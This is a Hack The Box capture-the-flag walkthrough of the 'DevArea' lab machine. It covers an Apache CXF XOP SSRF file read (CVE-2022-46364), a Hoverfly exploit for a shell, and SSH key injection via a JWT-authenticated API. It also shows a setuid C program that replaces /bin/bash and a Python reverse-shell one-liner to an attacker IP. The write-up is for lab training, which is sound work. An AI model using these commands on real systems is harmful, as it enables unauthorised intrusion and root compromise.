DevArea Walthrough Hack The Box
Vivek Goswami
Vivek Goswami
6 min read
·
May 8, 2026






Welcome to another Hack the Box walkthrough. In this blog post, I have demonstrated how I owned the DevArea machine on Hack the Box. Hack The Box is a cybersecurity platform that helps you bridge knowledge gaps and prepares you for cyber security jobs.

Key Highlights

This writeup guides you through the DevArea machine on Hack The Box, from initial recon to root.
1. DevArea is a Medium level Linux Machine.
2.Discover web application vulnerabilities and perform directory enumeration to find a login page.
3. Learn how a simple method can lead to capturing admin credentials through a clever exploit.
4.Use your foothold to escalate from a standard user to root on the Unix system.
5. Find both the user and root flags by escalating privileges and exploring the file system.

Let’s start with Recon

Reconnaissance
Initial Port Scanning

Running a scan reveals the following ports:

21/tcp (FTP): Anonymous login is enabled.
7777/tcp (Custom): Custom syswatch service.
8080/tcp (HTTP-Proxy): Hosting an Apache CXF web service (Jetty).
8500/tcp (HTTP Proxy): Hoverfly proxy listener.
8888/tcp (HTTP): Hoverfly web dashboard/API.

Press enter or click to view image in full size

nmap scan
Set ip of machine in /etc/host

while exploring ports i got port 80, 8080,8500,8888 open , so let’s check on web — — And here i got a web page on 80

On port 8500- i got nothing

port-8888 — A login page is there on hoverfly Dashboard

Press enter or click to view image in full size

The site loaded successfully on http://devarea.htb and appeared to be a freelancer-style platform connecting developers with companies. I enumerated the available sections including Home, Jobs, Developers, Companies, About, and Contact, along with authentication features like Login and Register.

We also got anonymous login allowed- ftp

while exploring ftp i got a employee-services.jar file inside a directory pub

Press enter or click to view image in full size

Decompiled .jar file

According to the jar file name obtained, the function is employee-related services, so some information is obtained through decompiling.

Use of Jadx For decompiling, the tool kali is not self-contained, so it needs to be installed directly sudo apt install jadx -y Can

Execute the command jadx-gui to open the graphical and open the .jar file that you just downloaded.

Press enter or click to view image in full size

WSDL available at http://localhost:8080/employeeservice?wsdl

let’s curl this-

curl http://ip:8080/employeeservice?wsdl

Press enter or click to view image in full size

Key Finding

The JAR bundles Apache CXF running on Jetty 9.4.27 (2020). This exposes a SOAP endpoint at http://devarea.htb:8080/employeeservice. Old CXF versions resolve XOP Include URIs without scheme validation — this is now a clear target.

XOP Include SSRF via CVE-2022–46364 (Apache CXF)
While Googling the CXF version leads us straight to CVE-2022–46364. The SOAP endpoint processes MTOM multipart requests with xop:Include elements without validating the URI scheme. This is not classic XXE — it abuses XOP Includes inside MTOM multipart requests, which CXF resolves server-side and embeds into the response. The result is an unauthenticated SSRF with arbitrary file read.

MTOM (Message Transmission Optimization Mechanism) is a SOAP extension for efficiently sending binary attachments — instead of base64-encoding them inline, attachments are referenced via xop:Include elements with an href attribute. Apache CXF processes these href URIs server-side to assemble the message. In vulnerable versions, CXF never validates that the URI scheme is safe, so href="file:///etc/passwd" is resolved just as willingly as a legitimate attachment URI. The file contents are then base64-encoded and returned inside the SOAP response body.

I’ll use the public PoC from kasem545/CVE-2022–46364-Poc.

copied it from his git repo and created a file as abc.py with sudo nano abc.py and pasted the script there

Run the exploit and it got successful

command used —

python3 abc.py -t http://devarea.htb:8080/employeeservice -s file:///etc/passwd -d devarea.htb

Press enter or click to view image in full size

from googling i get to know about the internal creds path of hoverfly dashboard

now let’s try to extract creds

Press enter or click to view image in full size

Here we got the password so , let’s login to the dashboard

While exploring i get to know that there’s another exploit in hoverfly login page — CVE-2025–54123

here i got the poc — https://github.com/davidzzo23/CVE-2025-54123/blob/main/CVE-2025-54123.py

I opened a listner in new tab on port 4444

Let’s run the exploit

Press enter or click to view image in full size

And we got the shell

Press enter or click to view image in full size

i got the user flag

Press enter or click to view image in full size

flag 1
using command sudo -l i get to know about the syswatch.sh

Become a Medium member
/opt/syswatch/syswatch.sh

Press enter or click to view image in full size

As we can see here , plugin arguments are allowed .

Now , I’m going to open a ssh tunnel in different terminal with command:

ssh -i ~/.ssh/id_ed25519 dev_ryan@devarea.htb -L 0.0.0.0:7777:127.0.0.1:7777 -fN

but we don’t have password or ssh key to login

Let’s create ssh key pair first

run this command in your kali : ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519

Press enter or click to view image in full size

After this do cat to copy that public key

cat ~/.ssh/id_ed25519.pub

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIZgpvmk5Ez9nCEisG6RNjYo08MLJiOb3qnAHrD42NFH kali@kali

Now i have to inject new public key in hoverfly middleware api in dev_ryan account . It can be done with web login or using curl

Press enter or click to view image in full size

Token fetched
now inject ssh key and also don’t forget to inject jwt token in front of Bearer

Press enter or click to view image in full size

ssh key injected
Let’s trigger and check mode with curl

 curl http://devarea.htb:8888/api/v2/hoverfly/mode \
  -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODg2NzEzOTMsImlhdCI6MTc3NzYzMTM5Mywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.N77Wq7yq15KkbsSzKL5X-uKxvPIJGth6ym_ZjlcwMEL1Yx_spx4LBfSTk71aXgH11nDVS7D5bskaJHq32w070A"
{"mode":"simulate","arguments":{"matchingStrategy":"strongest"}}   
Trigger middleware with soap request

curl -s http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<root.message@cxf.apache.org>"; boundary="----=_Part_0"' \
  --data-binary $'------=_Part_0\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <root.message@cxf.apache.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/"><soapenv:Header/><soapenv:Body><dev:submitReport><arg0><confidential>false</confidential><content>test</content><department>IT</department><employeeName>admin</employeeName></arg0></dev:submitReport></soapenv:Body></soapenv:Envelope>\r\n------=_Part_0--\r\n'
Now Let’s try ssh login again

ssh -i ~/.ssh/id_ed25519 dev_ryan@devarea.htb

and this time we got login

Ok as i got ssh access i’ll try to create a c file — shell.c

cat > /tmp/shell.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
void main() {
    setuid(0);
    setgid(0);
    system("chown root:root /tmp/bash; chmod +s /tmp/bash");
}
EOF
compile the file with — cd /tmp
gcc -static -o pwn shell.c

Overwrite successfull

Press enter or click to view image in full size

file compiled successfully

now backup /bin/bash with -

cp /bin/bash /tmp/bash.bak
cp /bin/bash /tmp/bash
ssh cannot directly replace bin/bash because ssh itself use bash ,

so i had to open a reverse shell in my kali again

nc -lvnp 80

and run this on the target —

python3 -c ‘import os,pty,socket;s=socket.socket();s.connect((“YOUR_IP”,80));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(“sh”)’ &

after doing this you’ll get connected to reverse shell , now exit ssh and start working on reverse shell

As The overwrite is successful.

Next, we trigger the exploit further.

cp /bin/bash /tmp/bash.bak
cp /bin/bash /tmp/bash
cp pwn /bin/bash
sudo /opt/syswatch/syswatch.sh plugin service_monitor.sh
/tmp/bash -p
Press enter or click to view image in full size

This error occur because i’ve not closed dev_ryan’s ssh shell , so i’ll try it again after closing that

Press enter or click to view image in full size

Got the root access
Now let’s find the root flag


With root access obtained and the final flag captured, the machine was fully compromised end-to-end. Initial enumeration, privilege escalation, persistence opportunities, and final exploitation all came together in a complete attack chain. This box was an absolute rollar-coaster ride demonstration that medium-level machines are less about one trick and more about combining small findings into a decisive compromise. Root flag secured. Target conquered.

Happy Hacking

Follow me on Linkdin:www.linkedin.com/in/vivekgoswmii
